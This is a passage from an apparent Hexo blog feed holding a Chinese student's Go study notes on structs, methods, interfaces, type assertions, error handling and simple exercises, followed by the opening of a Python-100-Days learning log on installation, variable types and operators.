  <span class="hljs-comment">//第二种定义方法</span><br>    p2 := person&#123;&#125;<br>p2.age = <span class="hljs-number">19</span><br>fmt.Println(p2.age)<br>    <span class="hljs-comment">//第三种定义方法</span><br>    p3 := person&#123;age: <span class="hljs-number">20</span>, sex: <span class="hljs-string">&quot;f&quot;</span>&#125;    <span class="hljs-comment">//结构体的赋值是冒号,跟map一样</span><br>fmt.Println(p3)<br>&#125;<br><br><span class="hljs-keyword">type</span> person <span class="hljs-keyword">struct</span> &#123;   <span class="hljs-comment">//type和struct是关键字</span><br>age  <span class="hljs-type">int</span><br>name <span class="hljs-type">string</span><br>sex  <span class="hljs-type">string</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> p1 person<br>p1.age = <span class="hljs-number">18</span><br>p1.name = <span class="hljs-string">&quot;小明&quot;</span><br>p1.sex = <span class="hljs-string">&quot;m&quot;</span><br><span class="hljs-keyword">var</span> p *person = &amp;p1<br>fmt.Println(p, *p)    <span class="hljs-comment">//&amp;&#123;18 小明 m&#125; &#123;18 小明 m&#125;  第一个输出带&amp;</span><br>    p.age = <span class="hljs-number">29</span>            <span class="hljs-comment">//指针修改,则原来的也修改</span><br>fmt.Println(p1)       <span class="hljs-comment">//&#123;29 小明 m&#125;</span><br>&#125;<br><br><span class="hljs-keyword">type</span> person <span class="hljs-keyword">struct</span> &#123;<br>age  <span class="hljs-type">int</span><br>name <span class="hljs-type">string</span><br>sex  <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>w1 := worker&#123;name: <span class="hljs-string">&quot;小明&quot;</span>, age: <span class="hljs-number">19</span>, sex: <span class="hljs-string">&quot;m&quot;</span>&#125;<br>w1.work()  <span class="hljs-comment">//小明 在工作</span><br>w2 := &amp;worker&#123;name: <span class="hljs-string">&quot;小明&quot;</span>, age: <span class="hljs-number">19</span>, sex: <span class="hljs-string">&quot;m&quot;</span>&#125;    <span class="hljs-comment">//&amp;是取地址,这里是w2是结构体指针</span><br>w2.work()  <span class="hljs-comment">//小明 在工作</span><br>&#125;<br><br><span class="hljs-keyword">type</span> worker <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>sex  <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(w worker)</span></span> work() &#123;        <span class="hljs-comment">//这里建立一个局部的结构体变量的对象用于进行操作 这里是空格不是逗号,work()是方法名</span><br>fmt.Println(w.name, <span class="hljs-string">&quot;在工作&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="模拟继承性"><a href="#模拟继承性" class="headerlink" title="模拟继承性"></a>模拟继承性</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//创建pers父类对象</span><br>p1 := pers&#123;name: <span class="hljs-string">&quot;小明&quot;</span>, age: <span class="hljs-number">18</span>&#125;<br>fmt.Println(p1.name, p1.age)<br>p1.eat()<br><span class="hljs-comment">//创建子类对象</span><br>s1 := stu&#123;pers&#123;name: <span class="hljs-string">&quot;小光&quot;</span>, age: <span class="hljs-number">19</span>&#125;, <span class="hljs-string">&quot;qdyz&quot;</span>&#125; <span class="hljs-comment">//   pers的结构体嵌套是匿名字段,所以后面的school也只能用匿名字段的方法赋值</span><br>fmt.Println(s1.school)<br><span class="hljs-comment">//子类对象调用父类方法</span><br>s1.eat()<br><span class="hljs-comment">//子类调用自定义方法,父类对象不能调用子类的方法</span><br>s1.study()<br>&#125;<br><br><span class="hljs-comment">//父类</span><br><span class="hljs-keyword">type</span> pers <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-comment">//子类</span><br><span class="hljs-keyword">type</span> stu <span class="hljs-keyword">struct</span> &#123;<br>pers   <span class="hljs-comment">//结构体嵌套,模拟继承性</span><br>school <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-comment">//父类方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p pers)</span></span> eat() &#123;<br>fmt.Println(<span class="hljs-string">&quot;父类方法,吃米饭&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//子类自定义方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s stu)</span></span> study() &#123;<br>fmt.Println(<span class="hljs-string">&quot;子类自定义方法,在学习&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//子类重写方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s stu)</span></span> eat() &#123;        <span class="hljs-comment">//方法中的局部变量的名字可以一样</span><br>fmt.Println(<span class="hljs-string">&quot;子类重写的吃饭方法&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口有点类似结构体的感觉,只要有别的结构体的对象调用接口,那么这些结构体都可以相当于包含在接口所在的大类里</p><p>接口可以创建接口类型的变量,而且调用了接口的结构体的对象可以算作接口创建的对象</p><p>但是接口创建的变量不能使用调用接口的结构体中的对象的信息</p><p>接口中的内容是方法,不是具体值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>m1 := mouse&#123;<span class="hljs-string">&quot;原厂&quot;</span>&#125;<br>m1.start()<br>m1.end()<br>u1 := uDisck&#123;<span class="hljs-string">&quot;64g&quot;</span>&#125;<br>u1.start()<br>u1.end()<br>test(m1)<br>test(u1)<br><span class="hljs-keyword">var</span> usb USB = m1<br>usb.start()<br>arr := [<span class="hljs-number">3</span>]USB&#123;m1, u1&#125;<br>fmt.Println(arr)<br>&#125;<br><br><span class="hljs-comment">//定义接口  usb</span><br><span class="hljs-keyword">type</span> USB <span class="hljs-keyword">interface</span> &#123;<br>start()<br>end()<br>&#125;<br><br><span class="hljs-comment">//定义鼠标类对象</span><br><span class="hljs-keyword">type</span> mouse <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-comment">//定义u盘类对象</span><br><span class="hljs-keyword">type</span> uDisck <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-comment">//鼠标类对象的接口</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m mouse)</span></span> start() &#123;<br>fmt.Println(m.name, <span class="hljs-string">&quot;鼠标开始&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m mouse)</span></span> end() &#123;<br>fmt.Println(m.name, <span class="hljs-string">&quot;鼠标结束&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//u盘类对象的接口</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u uDisck)</span></span> start() &#123;<br>fmt.Println(u.name, <span class="hljs-string">&quot;u盘ok&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u uDisck)</span></span> end() &#123;<br>fmt.Println(u.name, <span class="hljs-string">&quot;可以拔出&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(usb USB)</span></span> &#123;<br>usb.start()<br>usb.end()<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>map1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br>map1[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;hahah&quot;</span><br>map1[<span class="hljs-number">1</span>] = <span class="hljs-number">123</span><br>fmt.Println(map1)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="接口断言"><a href="#接口断言" class="headerlink" title="接口断言"></a>接口断言</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := sanj&#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Println(s1.area())<br>fmt.Println(s1.peri())<br>c1 := cir&#123;<span class="hljs-number">2</span>&#125;<br>fmt.Println(c1.peri())<br>fmt.Println(c1.area())<br><br><span class="hljs-keyword">var</span> sh1 shape = s1<br>sh1.area()<br>test(s1)<br>test(c1)<br>test(sh1)<br>fmt.Print(<span class="hljs-string">&quot;\n&quot;</span>)<br>fmt.Println(<span class="hljs-string">&quot;接口断言&quot;</span>)<br>gettype(s1)<br>gettype(c1)<br>gettype(sh1)<br>fmt.Println(<span class="hljs-string">&quot;另一种接口断言&quot;</span>)<br>gete(s1)<br>gete(c1)<br>gete(sh1)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">gettype</span><span class="hljs-params">(a shape)</span></span> &#123;<br><span class="hljs-comment">//接口断言,判断传入的数据属于哪个结构体</span><br><span class="hljs-comment">//判断是否属于三角类型</span><br><span class="hljs-keyword">if</span> v, ok := a.(sanj); ok &#123;<br>fmt.Println(<span class="hljs-string">&quot;三角形,三边分别是&quot;</span>, v.a, v.b, v.c)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> va, ok := a.(cir); ok &#123;<br>fmt.Println(<span class="hljs-string">&quot;是圆形,半径是&quot;</span>, va.r)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;no&quot;</span>)<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">gete</span><span class="hljs-params">(a shape)</span></span> &#123;<br><span class="hljs-keyword">switch</span> v := a.(<span class="hljs-keyword">type</span>) &#123; <span class="hljs-comment">//type是关键字,括号里面就直接写type</span><br><span class="hljs-keyword">case</span> sanj:<br>fmt.Println(<span class="hljs-string">&quot;是三角,第一个边长是&quot;</span>, v.a)<br><span class="hljs-keyword">case</span> cir:<br>fmt.Println(<span class="hljs-string">&quot;是圆,半径是&quot;</span>, v.r)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">type</span> shape <span class="hljs-keyword">interface</span> &#123;<br>peri() <span class="hljs-type">float64</span><br>area() <span class="hljs-type">float64</span><br>&#125;<br><span class="hljs-keyword">type</span> sanj <span class="hljs-keyword">struct</span> &#123;<br>a, b, c <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s sanj)</span></span> peri() <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> s.a + s.b + s.c<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s sanj)</span></span> area() <span class="hljs-type">float64</span> &#123;<br>p := s.peri() / <span class="hljs-number">2</span><br>are := math.Sqrt(p * (p - s.a) * (p - s.b) * (p - s.c))<br><span class="hljs-keyword">return</span> are<br>&#125;<br><br><span class="hljs-keyword">type</span> cir <span class="hljs-keyword">struct</span> &#123;<br>r <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c cir)</span></span> peri() <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">3</span> * c.r * <span class="hljs-number">2</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c cir)</span></span> area() <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">3</span> * c.r * c.r<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(s shape)</span></span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;面积是:%.2f,周长是%.2f&quot;</span>, s.area(), s.peri())<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="错误和异常"><a href="#错误和异常" class="headerlink" title="错误和异常"></a>错误和异常</h2><p>处理异常需要调用os包(import os)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>f, err := os.Open(<span class="hljs-string">&quot;test.txt&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;不存在文件&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;成功读取文件&quot;</span>, f.Name())<br>&#125;<br><span class="hljs-comment">//只打印不存在文件</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230804181310.png"></p><h2 id="函数库"><a href="#函数库" class="headerlink" title="函数库"></a>函数库</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//sort排序(正序)  只能用于切片,不能用于数组</span><br>arr := [<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>&#125;<br>arr1 := arr[:]<br>sort.Ints(arr1)<br>fmt.Println(arr1)  <span class="hljs-comment">//1 3 5 6</span><br><span class="hljs-comment">//字符串按照首字母ascii排序</span><br>ar := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;abx&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;UK&quot;</span>, <span class="hljs-string">&quot;呃呃呃&quot;</span>&#125;<br>sort.Strings(ar)<br>fmt.Println(ar)    <span class="hljs-comment">//[A UK abx 呃呃呃]</span><br></code></pre></td></tr></table></figure><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><h3 id="典中典水仙花"><a href="#典中典水仙花" class="headerlink" title="典中典水仙花"></a>典中典水仙花</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> ge <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> sh <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> bai <span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">100</span>; i &lt; <span class="hljs-number">1000</span>; i++ &#123;<br>ge = i % <span class="hljs-number">10</span><br>sh = i / <span class="hljs-number">10</span> % <span class="hljs-number">10</span><br>bai = i / <span class="hljs-number">100</span><br><span class="hljs-keyword">if</span> i == ge*ge*ge+sh*sh*sh+bai*bai*bai &#123;<br>fmt.Println(i)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="求素数"><a href="#求素数" class="headerlink" title="求素数"></a>求素数</h3><p>j要从2开始</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">2</span>; i &lt;= <span class="hljs-number">100</span>; i++ &#123;<br>flag := <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> j := <span class="hljs-number">2</span>; j &lt; i; j++ &#123;<br><span class="hljs-keyword">if</span> i%j == <span class="hljs-number">0</span> &#123;<br>flag = <span class="hljs-literal">false</span><br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> flag &#123;<br>fmt.Println(i)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>python</title>
    <link href="/2023/08/20/python/"/>
    <url>/2023/08/20/python/</url>
    
    <content type="html"><![CDATA[<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>学sql学麻了,换点别的学学<br>来源:<code>https://github.com/jackfrued/Python-100-Days.git</code><br><a href="https://linklearner.com/#/learn/detail/60">https://linklearner.com/#/learn/detail/60</a><br>学习计划安排是100天,感觉能学完一半就不错了</p><h1 id="4-27"><a href="#4-27" class="headerlink" title="4.27"></a>4.27</h1><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a> 下载windows installer(64-bit),勾选自动配置路径<br>因为下过python2.7用来跑sqlmap,所以还需要再设置一下环境</p><h3 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h3><p>1.右键点击左下角windows,打开系统<br>2.选择高级系统设置,打开环境变量<br>3.在用户变量下可以看到path里已经有了安装时自动配置好的路径<br>4.在下面的系统变量下,打开path,新建添加python3的安装路径,将python3上移到python2的上面,这样就可以设置python3.11为默认<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427144818.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427144818.png" alt="img"></a><br>5.win r cmd 输入python,可以看到版本号为3.11,继续输入import this,可以看到开发者写的python之禅</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>用vscode打开,下载商店第一个python扩展,新建文件夹,改名为test.py,内容是print (‘hello word’),run code运行<br>在新建一个文件夹专门分给python之后,用vscode打开该文件夹,在终端输入python后即可进入repl界面(python交互环境)</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="变量和类型"><a href="#变量和类型" class="headerlink" title="变量和类型"></a>变量和类型</h3><table><thead><tr><th>类型</th><th>定义</th></tr></thead><tbody><tr><td>整型</td><td>在py2.x版本还分为int和long,在3.x统称为int,且支持各种进制的转化</td></tr><tr><td>浮点</td><td>小数,支持科学计数法</td></tr><tr><td>字符串</td><td>单引号双引号引起即可,但双引号更智能一点,<code>&#39;print\n&#39;</code>会全都连着\n全部打印,而用双引号引起来则可以正确打印换行</td></tr><tr><td>布尔</td><td>True和False,注意大小写</td></tr><tr><td>复数</td><td>3+5j,j取代了i,了解即可</td></tr></tbody></table><h3 id="变量使用"><a href="#变量使用" class="headerlink" title="变量使用"></a>变量使用</h3><p>用vscode学习时要保存后才能运行,跟以前的c,c++的编译器有点区别</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=1<br><span class="hljs-attribute">b</span>=2<br><span class="hljs-built_in">print</span>(a+b)<br></code></pre></td></tr></table></figure><p>type()函数 : 说明对象的类型<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427154359.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427154359.png" alt="img"></a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=1<br><span class="hljs-built_in">print</span>(type(a))    #&lt;class <span class="hljs-string">&#x27;int&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><ul><li><code>int()</code>：将一个数值或字符串转换成整数，可以指定进制。</li><li><code>float()</code>：将一个字符串转换成浮点数。</li><li><code>str()</code>：将指定的对象转换成字符串形式，可以指定编码。</li><li><code>chr()</code>：将整数转换成该编码对应的字符串（一个字符）。</li><li><code>ord()</code>：将字符串（一个字符）转换成对应的编码（整数）。<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427155226.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230427155226.png" alt="img"></a></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-built_in">int</span>(<span class="hljs-selector-tag">input</span>())<br>b=<span class="hljs-built_in">int</span>(<span class="hljs-selector-tag">input</span>(<span class="hljs-string">&#x27;b= &#x27;</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;%d+%d=%d&#x27;</span>%(a,b,a+b)</span></span>)<br></code></pre></td></tr></table></figure><p>点击运行,在终端输入a的数值</p><ul><li><p><code>**</code>指数 <code>2**3=8</code></p></li><li><p>% 取模</p></li><li><p><code>//</code>整除</p></li><li><p>[]切片 序列[起始下标:结束下标:步长] (不包含结束下标的内容)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">fruits=<span class="hljs-selector-attr">[<span 